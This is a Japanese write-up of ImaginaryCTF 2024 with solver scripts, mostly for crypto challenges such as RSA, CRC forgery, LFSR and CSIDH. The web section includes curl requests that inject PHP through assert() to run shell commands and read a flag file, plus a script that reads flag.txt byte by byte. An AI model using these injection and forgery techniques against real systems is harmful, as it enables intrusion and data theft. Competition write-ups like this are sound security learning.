@@ -1,0 +1,448 @@
+[https://2024.imaginaryctf.org/:title=ImaginaryCTF 2024] に参加した。日本時間で 2024-07-20 04:00 から 2024-07-22 04:00 まで。
+
+結果は 93/1457 位。 ([https://2024.imaginaryctf.org/Leaderboard:title=順位表])
+
+* 解法集
+** Crypto
+*** base64
+base64 (の数値そのまま版) でエンコードされた文字列が与えられるので復元してくださいという問題。
+
+>|python|
+from Crypto.Util.number import long_to_bytes
+
+secret_key = [10, 52, 23, 14, 52, 16, 3, 14, 37, 37, 3, 25, 50, 32, 19, 14, 48, 32, 35, 13, 54, 12, 35, 12, 31, 29, 7, 29, 38, 61, 37, 27, 47, 5, 51, 28, 50, 13, 35, 29, 46, 1, 51, 24, 31, 21, 54, 28, 52, 8, 54, 30, 38, 17, 55, 24, 41, 1]
+
+val = 0
+cur = 1
+for v in secret_key:
+    val += v * cur
+    cur *= 64
+
+print(long_to_bytes(val))
+||<
+
+*** integrity
+妙な作り方をした RSA 署名が与えられるので、元のメッセージを復元せよという問題。
+crc_hqx(long_to_bytes(d), 42) は 65536 通りしかないので全探索で求めることができ、そこからユークリッドの互除法を使えば良い。
+(https://www.slideshare.net/slideshow/rsa-n-ssmjp/72368516 の「その 8」)
+
+>|python|
+from Crypto.Util.number import long_to_bytes
+
+# 問題で与えられた数値
+n = ...
+ct = ...
+signature = ...
+
+crc = None
+
+target = pow(signature, 65537, n)
+cur = 1
+for crc_cand in range(2**16):
+    if cur == target:
+        crc = crc_cand
+        break
+    cur = cur * ct % n
+
+print('crc =', crc)
+
+# Find (x, y) such that x * crc + y * 65537 = 1
+x = pow(crc, -1, 65537)
+y = (-x * crc + 1) // 65537
+
+# Calculate the flag
+flag = pow(signature, x, n) * pow(ct, y, n) % n
+print(long_to_bytes(flag).decode('utf-8'))
+||<
+
+*** tango
+
+暗号文は (nonce) + (平文の CRC32) + (暗号文 (認証タグなし)) という構造である。
+同一セッションでは常に同じ鍵で暗号化しているので、nonce も同じにすれば実質的に同じ乱数ストリームとの xor をとるだけになる。
+正規の方法だと、暗号文において command は 3 文字の文字列しか許容されないが、暗号文や平文を偽造すればよい。
+暗号文の偽造は xor 暗号なので簡単で、CRC32 の偽造は CRC32 の線形性を使えばできる。
+
+>|python|
+import sys
+from pwn import *
+from zlib import crc32
+
+local = len(sys.argv) > 1
+
+io = process(['python3', 'server.py']) if local else remote('tango.chal.imaginaryctf.org', 1337)
+
+io.recvuntil(b'Welcome to the Tango server! What would you like to do?')
+io.recvuntil(b'[Q]uit\n> ')
+io.sendline(b'E')
+io.sendline(b'sts')
+io.recvuntil(b'Your encrypted packet is: ')
+packet = io.recvline()
+
+ct = bytes.fromhex(packet.decode().strip())
+nonce = ct[:8]
+checksum = int.from_bytes(ct[8:12], 'big')
+ciphertext = ct[12:]
+print('len(ciphertext) =', len(ciphertext))
+
+# Forge checksum and ciphertext
+dummy1 = b'{"user": "user", "command": "sts", "nonce":"'
+dummy2 = b'{"user": "root", "command": "flag", "once":"'
+dummy1 = dummy1.ljust(len(ciphertext), b'A')
+dummy2 = dummy2.ljust(len(ciphertext), b'A')
+crcdiff = crc32(dummy1) ^ crc32(dummy2)
+newciphertext = []
+for i in range(len(ciphertext)):
+    newval = ciphertext[i] ^ dummy1[i] ^ dummy2[i]
+    newciphertext.append(newval)
+forged = nonce + int.to_bytes(checksum ^ crcdiff, 4, 'big') + bytes(newciphertext)
+
+io.recvuntil(b'[Q]uit\n> ')
+io.sendline(b'R')
+io.recvuntil(b'our encrypted packet (hex): ')
+io.sendline(forged.hex().encode('ascii'))
+print(io.recvline().decode('utf-8'))
+||<
+
+*** solitude
+RNG のやっていることは複雑だが、結局のところ state は 0 から 129 までの長さ 130 の順列であり、rng.next() も 0 から 127 までの値しか返さない。
+各文字についてどの文字が出たかの調査を行えば、flag が復元できそうだが、実際のところどんな文字であっても 0 から 127 までが現れるので、この方法では復元できない。
+ここで、RNG を実際に動作させてみると、特定の値だけ出現確率が他の値のほぼ 2 倍という事象が起こり得ることがわかる。
+そのため、単に出現を調査するだけでなく頻度分析を行うとうまくいく。
+
+>|python|
+import sys
+from pwn import *
+
+local = len(sys.argv) > 1
+
+io = process(['python3', 'main.py']) if local else remote('solitude.chal.imaginaryctf.org', 1337)
+
+io.recvuntil(b'got flag? ')
+count = 10000
+io.sendline(str(count).encode('ascii'))
+
+flaglen = None
+
+freq = []
+
+for _ in range(count):
+    data = io.recvline()
+    data = bytes.fromhex(data.decode('ascii').strip())
+    if flaglen is None:
+        flaglen = len(data)
+        freq = [[0] * 128 for _ in range(flaglen)]
+    for i in range(flaglen):
+        freq[i][data[i]] += 1
+
+
+def highest(f):
+    return max(range(128), key=lambda i: f[i])
+
+high = highest(freq[0]) ^ ord('i')
+
+flag = [None] * flaglen
+for i in range(flaglen):
+    flag[i] = highest(freq[i]) ^ high
+
+print(bytes(flag).decode('ascii'))
+||<
+
+*** lf3r
+この手の初期 seed を求める問題では z3 を使いたくなる。
+参考: https://kyuri.hatenablog.jp/entry/2017/10/05/151918
+
+試しているうちに、z3 で剰余とかを扱うのがきつそうな感じがしたので、剰余になるべく触れないように以下の方針をとった。
+- carry[i]: ((self.state & self.mask).bit_count() & 1) << (self.n - 1) で最上位ビットが立ったかどうか
+- xs[i] == 2 * (xs[i] >> 1) + (xs[i]&1) が成り立つ。
+また 1 << (self.n - 1) = 2 (mod 3) なので、(xs[i] >> 1) + (2 if carry else 0) == xs[i + 1] も成り立つ。
+以上の式を使えば (xs[i]&1) と carry[i] の関係式が stream[i] と stream[i + 1] から導出できる。
+最終的に xs[i] % 3 == stream[i] という条件を 2 個くらい試して flag を取得。
+
+>|python|
+from z3 import *
+
+stream = ... # 問題で与えられた数列
+
+nsteps = 2048
+n = 256
+MASK = 0x560074275752B31E43E64E99D996BC7B5A8A3DAC8B472FE3B83E6C6DDB5A26E7
+
+s = Solver()
+xs = [BitVec(f'x{i}', n) for i in range(nsteps)]
+carry = [Bool(f'carry{i}') for i in range(nsteps - 1)]
+for i in range(2):
+    s.add(URem(xs[i], 3) == stream[i])
+
+for i in range(nsteps - 1):
+    tmp = LShR(xs[i], 1)
+    tmp = If(carry[i], tmp | 1 << (n - 1), tmp)
+    s.add(xs[i + 1] == tmp)
+    for lsb in range(2):
+        for carried in [False, True]:
+            rightval = (stream[i + 1] * 2 + lsb + (2 if carried else 0)) % 3
+            if rightval != stream[i]:
+                s.add(Or(xs[i] & 1 != lsb, carry[i] != carried))
+
+r = s.check()
+print(f'{r = }')
+if r == unsat:
+    print('Nothing to be done')
+    exit(1)
+
+proof = s.model()
+print(proof[xs[0]])
+seed = proof.eval(xs[0]).as_long()
+
+class LF3R:
+    def __init__(self, n, key, mask):
+        self.n = n
+        self.state = key & ((1 << n) - 1)
+        self.mask = mask
+
+    def __call__(self):
+        v = self.state % 3
+        self.state = (self.state >> 1) | (
+            ((self.state & self.mask).bit_count() & 1) << (self.n - 1)
+        )
+        return v
+
+
+def int_to_base(n, b):
+    digits = []
+    while n:
+        digits.append(n % b)
+        n //= b
+    return digits
+
+def base_to_int(digits, b):
+    n = 0
+    c = 1
+    for d in digits:
+        n += c * d
+        c *= b
+    return n
+
+
+lf3r = LF3R(n, seed, MASK)
+
+# discard 2048 bytes
+[lf3r() for _ in range(2048)]
+
+flag_digits = []
+for i in range(2048, len(stream)):
+    flag_digits.append((stream[i] + 2 * lf3r()) % 3)
+flag_int = base_to_int(flag_digits, 3)
+flag = flag_int.to_bytes((flag_int.bit_length() + 7) // 8, "big")
+print(f"{flag = }")
+||<
+
+*** coast
+
+sage --pip install pycryptodome を要した。
+
+SIDH には攻撃手法が知られているはずなのでまずはそれを見る。
+https://joint.imi.kyushu-u.ac.jp/wp-content/uploads/2022/08/220802_04moriya.pdf
+
+m の値が小さすぎるのが気になる。今回 m = 1 である。
+
+exchange の実装をみると es[i] = 1 のときと es[i] = -1 のときで行われる処理に違いがなさそうである。
+なので実際には 2^128 通りくらいしか鍵はない。
+(注: エントロピーは 81 ビット程度。
+>|sage|
+sage: (log(2/3.0)*2/3 + log(1/3.0)/3)*128
+-81.4738135417360
+||<
+)
+
+public key が点も含んでいるが、この点の位数を調べることで掛けた数が分かってしまう。
+例えば秘密鍵 priv において priv[0] != 0 の場合 (ls[0] = 3 なのでつまり最終的な積が 3 の倍数の場合)、 同種写像による G の行き先は位数が 3 の倍数ではない。
+>|console|
+sage: pub_bob[1]
+(6513647070475959647699583207721162855816591251116965673175324764506065749704905886485134724133875080092439935476237030141738358177674938538984380453209964808063327510331859618056702428547002394265768084944478541866225210621168019986767359297557996178378902254981536084665126018273301797760374115415514 : 5387141467798735312615286901194118227550620065984334257104333263637483749178837383319791846803161701061416237785879685282804903641810651533546481984610947336875659106524726200456639930296424541429479891194943767516402529694529914712855323978928408214528393669634050877945843150877854499436503198733652 : 1)
+sage: k = (p + 1)
+sage: pub_bob[1] * (k // ls[0])
+(0 : 1 : 0)
+sage: pub_bob[1] * (k // ls[1])
+(0 : 1 : 0)
+sage: pub_bob[1] * (k // ls[2])
+(5322189480544182832011971049829703560491522598707764860170097499035459584202642576271681048328082826150779517761822285185030358693879517644511735579472835823207946237343705693405400850462128766510590509437601175455537665170074590726959244525211794010374829888174012316454905144073239036687785587052940 : 11716955669584001430171043386116026224151702247156420314831486639061876732250956862050431022914406114606971298297011607303383864122819204604175787664247351625786694710920488473477176881102782428832882505407903371477278739263954873881764003031639973656867580745561410627193201367584502899286537175922914 : 1)
+sage: pub_bob[1] * (k // ls[3])
+(0 : 1 : 0)
+sage: pub_bob[1] * (k // ls[4])
+(0 : 1 : 0)
+||<
+
+最終的なコードは以下である。
+
+>|sage|
+from Crypto.Cipher import AES
+from hashlib import sha256
+
+# 問題で与えられた値
+base_ser = ...
+pub_alice_ser = ...
+pub_bob_ser = ...
+ct = ...
+iv = b'\x94j;L,\xf3\xde\xc5'
+
+ls = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 929]
+p = 4 * product(ls) - 1
+F = GF(p)
+E0 = EllipticCurve(F, [1, 0])
+G = E0.gen(0)
+base = (E0, G)
+
+# recover Alice's private key
+alice_E = EllipticCurve(GF(p), [0, 0, 0, pub_alice_ser[0], pub_alice_ser[1]])
+alice_G = alice_E([pub_alice_ser[2], pub_alice_ser[3], 1])
+alice_priv = []
+for l in ls:
+    if (alice_G * ((p + 1) // l)).is_zero():
+        alice_priv.append(l)
+
+
+def exchange(pub, priv):
+    E, G = pub
+    es = priv[:]
+    for l in es:
+        E.set_order(p + 1)
+        while True:
+            P = E.random_point()
+            Q = (p + 1) // l * P
+            if not Q:
+                continue
+            Q.set_order(l)
+            phi = E.isogeny(Q)
+            E, P = phi.codomain(), phi(P)
+            G = phi(G)
+            break
+    return E, G
+
+bob_E = EllipticCurve(GF(p), [0, 0, 0, pub_bob_ser[0], pub_bob_ser[1]])
+bob_G = bob_E([pub_bob_ser[2], pub_bob_ser[3], 1])
+
+shared_1 = exchange((bob_E, bob_G), alice_priv)
+
+shared_secret = int(shared_1[0].j_invariant() + shared_1[1][0])
+key = sha256(str(shared_secret).encode()).digest()
+cipher = AES.new(key, AES.MODE_CTR, nonce=iv)
+flag = cipher.decrypt(ct)
+
+print(flag)
+||<
+
+** Misc
+*** starship
+4 で incoming の評価を知ることができる。incoming は 2 個とも enemy と判定されるまでガチャを回したのだから enemy に決まっているが、
+重要なのは incoming の座標を知れることである。
+42 でデータの追加ができる。そこで incoming[1] の座標と、それが friendly であることを教えてやれば良い。
+その後 2 で学習して 4 で結果を得れば良い。
+
+** Web
+*** readme
+Dockerfile にフラグが書いてある。
+
+*** journal
+https://blog.hamayanhamayan.com/entry/2021/12/18/132236 に以下の記述がある。
+
+>>
+PHP assert() Vulnerable to Local File Inclusion – All things in moderation
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); // vulnerable code!
+assert("strpos('', 'qwer') === false && strlen(file_get_contents(“../../../../../etc/passwd”)) == 0 && strpos(‘1', '..') === false") or die("Detected hacking attempt!"); // vulnerable code!
+$file = ', 'qwer') === false && strlen(file_get_contents(“../../../../../etc/passwd”)) == 0 && strpos(‘1をやった結果
+<<
+
+これを参考にして以下のようなリクエストを投げる。
+>|bash|
+# これでフラグの名前がわかる
+curl -sS 'http://journal.chal.imaginaryctf.org/?file=%27%20.system("ls%20/f*").%20%27'
+
+# フラグに対して cat する
+curl -sS 'http://journal.chal.imaginaryctf.org/?file=%27%20.system("cat%20/flag-cARdaInFg6dD10uWQQgm.txt").%20%27'
+||<
+
+*** P2C
+ユーザーから Python スクリプトを受け取って、それの結果に応じてページの背景色を設定するページである。
+
+ここで、色の決定プロセスが <code>print(色計算関数(ユーザーのスクリプト()))</code> のような呼び出し方をしているので、例えば以下のようなスクリプトで常に #800000 を設定させられる。
+
+>|python|
+print('(128, 0, 0)')
+exit()
+||<
+
+以下のようなスクリプトは #690000 を設定するので、flag の 0 文字目は 0x69 = 'i' である。
+
+>|python|
+dat = open('flag.txt','rb').read()
+print(f'({dat[0]}, 0, 0)')
+exit()
+||<
+
+これを flag のすべての文字に対してやれば良い。コードは以下である。
+
+>|python|
+import urllib.parse
+import requests
+import re
+import urllib
+
+def getpos(pos: int) -> int | None:
+    url = "http://p2c.chal.imaginaryctf.org/"
+
+    code = f"""
+dat = open('flag.txt','rb').read()
+print(f'({{dat[{pos}]}}, 0, 0)')
+exit()
+"""
+
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+    req = {
+        'code': code,
+    }
+    response = requests.post(url, headers=headers, data=urllib.parse.urlencode(req))
+
+    valid = re.compile(r"rgb\(([0-9]{1,3}), ([0-9]{1,3}), ([0-9]{1,3})\)")
+    match = valid.search(response.text)
+    if match:
+        if match.group(2) == "0" and match.group(3) == "0":
+            return int(match.group(1))
+
+
+ls = []
+while True:
+    byte = getpos(len(ls))
+    print(byte, ls)
+    if byte is None:
+        break
+    ls.append(byte)
+
+print(bytes(ls).decode('ascii'))
+||<
+
+終了後に他の参加者の writeup を読んだらもっと頭のいい方法があった。(https://blog.hamayanhamayan.com/entry/2024/07/22/145709#web-P2C で、直接フラグを出力する)
+
+** Forensics
+*** bom
+先頭 2 バイトをカットするとフラグになる。
+
+*** packed
+ダウンロードできる routed.pkz というファイルは zip archive である。
+
+>|console|
+$ file routed.pkz
+routed.pkz: Zip archive data, at least v2.0 to extract, compression method=deflate
+||<
+
+これの中には secret.png というファイルがあり、その中に flag が画像として書かれている。
+
+* まとめ
+良かった点は以下。
+- CSIDH 関連の問題を解くうちに CSIDH の理解が深まった
+- Crypto の解けそうな問題が大体解けた
+- Web 問題が少しだけ解けた
+
+反省点は以下。
+- reversing, pwn がかなり苦手で、解くための手立てが皆無だった
